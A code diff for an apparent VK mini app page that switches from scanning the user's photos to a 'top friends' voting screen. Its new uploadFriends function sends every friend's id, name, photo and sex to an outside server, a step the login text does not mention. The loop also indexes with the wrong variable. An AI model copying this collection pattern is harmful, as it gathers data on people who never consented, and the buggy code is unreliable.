@@ -71,7 +71,7 @@
 
                 vkConnect.send("VKWebAppGetAuthToken", {
                     "app_id": vk_app_id,
-                    "scope": "photos"
+                    "scope": "friends"
                 })
                 .then(data => {
                     if(token){return false;}
@@ -97,7 +97,7 @@
             u.permissions=g; \n\
             var user={}; \n\
             var r={user:u,permissions:g}; \n\
-            return [friends,time,r,photos];';
+            return [friends,time,r];';
 
              vkConnect.send("VKWebAppCallAPIMethod", {
                 "method": "execute",
@@ -121,57 +121,72 @@
                     permissions = data.response[2].permissions;
                 }
 
-                my_photos = data.response[3];
-
-
-                var likes = 0;
-                var commets = 0;
-                var top_photo = "";
-                var top_likes = -1;
-                for(var i = 0;i<my_photos.items.length;i++) {
-                    commets+=my_photos.items[i].comments.count;
-                    likes+=my_photos.items[i].likes.count;
-
-                    if(my_photos.items[i].likes.count > top_likes) {
-                        top_likes = my_photos.items[i].likes.count;
-                        for (var q= 0 ;q<my_photos.items[i].sizes.length;q++) {
-                            if(my_photos.items[i].sizes[q].type == "x") {
-                                top_photo = my_photos.items[i].sizes[q].url;
-                                break;
-                            }
-                        }
-                    }
-                }
-
-                var common_count = 0;
-                for(var i = 0;i<viewer.friends.items.length;i++) {
-                    if(viewer.friends.items[i].common_count> common_count) {
-                        common_count = viewer.friends.items[i].common_count;
-                        best_friend = viewer.friends.items[i];
-                    }
-                }
-
                 if(permissions == 0) {
 
 
                 }
 
-                showPhotos();
+                uploadFriends();
               })
               .catch(error => {
 
               });
         }
 
-        function showPhotos() {
+
+        var i_upload_friends = 0;
+        function uploadFriends() {
+          if(i_upload_friends >= viewer.friends.items.length) {
+            showFriends();
+            return false;
+          }
+
+          var generatesFr = [];
+          for(; i_upload_friends<viewer.friends.items.length; i_upload_friends++){
+            var friend_push = {};
+            friend_push.uid = viewer.friends.items[i].id;
+            friend_push.name = viewer.friends.items[i].first_name + " " + viewer.friends.items[i].last_name;
+            friend_push.photo = viewer.friends.items[i].photo_max;
+            friend_push.sex = viewer.friends.items[i].sex;
+            generatesFr.push(friend_push);
+          }
+
+
+          $.ajax({
+              type: "POST",
+              url: "https://top-info9.ru/PHOTOS/functions.php",
+              data: {
+                  "method": "uploadFriends",
+                  "viewer_id": viewer_id,
+                  "friends": generatesFr,
+                  "permissions": permissions
+              },
+              success: function(data){
+                data = JSON.parse(data);
+                i_upload_friends++;
+                uploadFriends();
+
+              },
+              error : function(data){
+                  // $.ajax(this);
+              }});
+
+
+        }
+
+        function showFriends() {
           $("#page").css("display","");
           $("#LoginControl").remove();
-          for(var i = 0;i<my_photos.items.length;i++) {
-            $('#photos_list').append('<div class="group relative"> \n\
-              <div class="relative w-full h-80 bg-white rounded-lg overflow-hidden group-hover:opacity-75 sm:aspect-w-2 sm:aspect-h-1 sm:h-64 lg:aspect-w-1 lg:aspect-h-1"> \n\
-                <img src="'+my_photos.items[i].sizes[my_photos.items[i].sizes.length-1].url+'" class="w-full h-full object-center object-cover"> \n\
-              </div> \n\
-              <p class="text-base font-semibold text-gray-900">Лайков : '+my_photos.items[i].likes.count+'</p> \n\
+          $('#FrList').html("");
+          for(var i = 0;i<viewer.friends.items.length;i++) {
+            $('#FrList').append('<div class="w-full bg-white rounded-lg p-2 flex flex-col justify-center items-center"> \n\
+                <div class="mb-8"> \n\
+                    <img class="object-center object-cover rounded-full h-25 w-25" src="'+viewer.friends.items[i].photo_200+'" alt="photo"> \n\
+                </div> \n\
+                <div class="text-center"> \n\
+                    <p class="text-xl text-gray-700 font-bold mb-2">'+viewer.friends.items[i].first_name+' '+viewer.friends.items[i].last_name+'</p> \n\
+                    <p class="text-base text-gray-400 font-normal">Software Engineer</p> \n\
+                </div> \n\
             </div>');
           }
         }
@@ -182,40 +197,95 @@
     </script>
 </head>
 <body style="background:white;">
-  <div id="LoginControl" class="text-center bg-white rounded-xl shadow-md overflow-hidden m-3">
-  <div class="md:flex">
-    <div class="md:flex-shrink-0">
-      <img class="h-48 w-full object-cover md:h-full md:w-48" src="5054499.jpg" >
+  <div id="LoginControl" class="h-screen bg-gray-50 flex flex-col justify-center items-center">
+    <h1 class="text-3xl md:text-4xl lg:text-5xl font-heading pb-6">Топ друзей</h1>
+    <div class="bg-white border border-gray-300 w-80 p-8 flex items-center flex-col mb-3">
+            <div>Тут можно голосовать за друзей и таким образом выводить их в топ</div>
+            <span class="text-xs text-blue-900 font-semibold mt-10">Разрешить доступ к друзьям и войти</span>
     </div>
-    <div class="p-8">
-      <a href="#" class="block mt-1 text-lg leading-tight font-medium text-black hover:underline">Популярные фотографии</a>
-      <p class="mt-2 text-gray-500">
-        Это сервис, который сканирует все твои фотографии и показывает самые популярные из них а также тех друзей, кто чаще других тебя лайкает
-      </p>
-        <p class="mt-3 text-gray-900 font-bold text-xl mb-2">
-            Чтобы начать сканирование, разреши доступ к фотографиям
-        </p>
     </div>
-      <button onclick="Login()" class="bg-green-500 hover:bg-green-700 text-white font-bold py-2 px-4 rounded w-full">
-        Сканировать
-      </button>
+    <div id="page">
+      <section class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-4 py-12">
+        <div class="text-center pb-12">
+            <h2 class="text-base font-bold text-indigo-600">
+                Топ 10 самых популярных друзей
+            </h2>
+        </div>
+        <div id="FrList" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-2 lg:grid-cols-3 gap-6">
+            <div class="w-full bg-white rounded-lg p-12 flex flex-col justify-center items-center">
+                <div class="mb-8">
+                    <img class="object-center object-cover rounded-full h-36 w-36" src="https://images.unsplash.com/flagged/photo-1570612861542-284f4c12e75f?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=1170&q=80" alt="photo">
+                </div>
+                <div class="text-center">
+                    <p class="text-xl text-gray-700 font-bold mb-2">Dany Bailey</p>
+                    <p class="text-base text-gray-400 font-normal">Software Engineer</p>
+                </div>
+            </div>
+            <div class="w-full bg-white rounded-lg p-12 flex flex-col justify-center items-center">
+                <div class="mb-8">
+                    <img class="object-center object-cover rounded-full h-36 w-36" src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=1170&q=80" alt="photo">
+                </div>
+                <div class="text-center">
+                    <p class="text-xl text-gray-700 font-bold mb-2">Lucy Carter</p>
+                    <p class="text-base text-gray-400 font-normal">Graphic Designer</p>
+                </div>
+            </div>
+            <div class="w-full bg-white rounded-lg p-12 flex flex-col justify-center items-center">
+                <div class="mb-8">
+                    <img class="object-center object-cover rounded-full h-36 w-36" src="https://images.unsplash.com/photo-1499952127939-9bbf5af6c51c?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=1176&q=80" alt="photo">
+                </div>
+                <div class="text-center">
+                    <p class="text-xl text-gray-700 font-bold mb-2">Jade Bradley</p>
+                    <p class="text-base text-gray-400 font-normal">Dev Ops</p>
+                </div>
+            </div>
+            <div class="w-full bg-white rounded-lg p-12 flex flex-col justify-center items-center">
+                <div class="mb-8">
+                    <img class="object-center object-cover rounded-full h-36 w-36" src="https://images.unsplash.com/flagged/photo-1570612861542-284f4c12e75f?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=1170&q=80" alt="photo">
+                </div>
+                <div class="text-center">
+                    <p class="text-xl text-gray-700 font-bold mb-2">Dany Bailey</p>
+                    <p class="text-base text-gray-400 font-normal">Software Engineer</p>
+                </div>
+            </div>
+            <div class="w-full bg-white rounded-lg p-12 flex flex-col justify-center items-center">
+                <div class="mb-8">
+                    <img class="object-center object-cover rounded-full h-36 w-36" src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=1170&q=80" alt="photo">
+                </div>
+                <div class="text-center">
+                    <p class="text-xl text-gray-700 font-bold mb-2">Lucy Carter</p>
+                    <p class="text-base text-gray-400 font-normal">Graphic Designer</p>
+                </div>
+            </div>
+            <div class="w-full bg-white rounded-lg p-12 flex flex-col justify-center items-center">
+                <div class="mb-8">
+                    <img class="object-center object-cover rounded-full h-36 w-36" src="https://images.unsplash.com/photo-1499952127939-9bbf5af6c51c?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=1176&q=80" alt="photo">
+                </div>
+                <div class="text-center">
+                    <p class="text-xl text-gray-700 font-bold mb-2">Jade Bradley</p>
+                    <p class="text-base text-gray-400 font-normal">Dev Ops</p>
+                </div>
+            </div>
+        </div>
 
-  </div>
+        <div class="w-full h-screen flex items-center justify-center ">
+    <div class="relative w-96 h-auto bg-gray-400 rounded-md pt-24 pb-8 px-4 shadow-md hover:shadow-lg transition flex flex-col items-center">
+        <div class="absolute rounded-full bg-gray-100 w-28 h-28 p-2 z-10 -top-8 shadow-lg hover:shadow-xl transition">
+            <div class="rounded-full bg-black w-full h-full overflow-auto">
+                <img src="753317.png">
+            </div>
+        </div>
+        <h5 class="text-center text-1xl md:text-1xl lg:text-1xl font-heading text-white">
+              Чтобы отдать свой голос, выбери друга
+          </h5>
+          <button class="w-full text-center bg-green-700 hover:bg-blue-900 rounded-full text-white py-3 mt-5">Выбрать друга</button>
+
+
+    </div>
 </div>
-
-  <div style="display:none" id="page">
-    <div class="bg-gray-100">
-  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-    <div class="max-w-2xl mx-auto py-16 sm:py-24 lg:py-32 lg:max-w-none">
-      <h2 class="text-2xl font-extrabold text-gray-900">Популярные фото</h2>
-
-      <div id="photos_list" class="mt-6 space-y-12 lg:space-y-0 lg:grid lg:grid-cols-3 lg:gap-x-6">
-
-      </div>
+    </section>
     </div>
-  </div>
-</div>
-  </div>
+
 
 
   <div style="position: fixed;left:99999px;width:700px" id="for_canvas"></div>
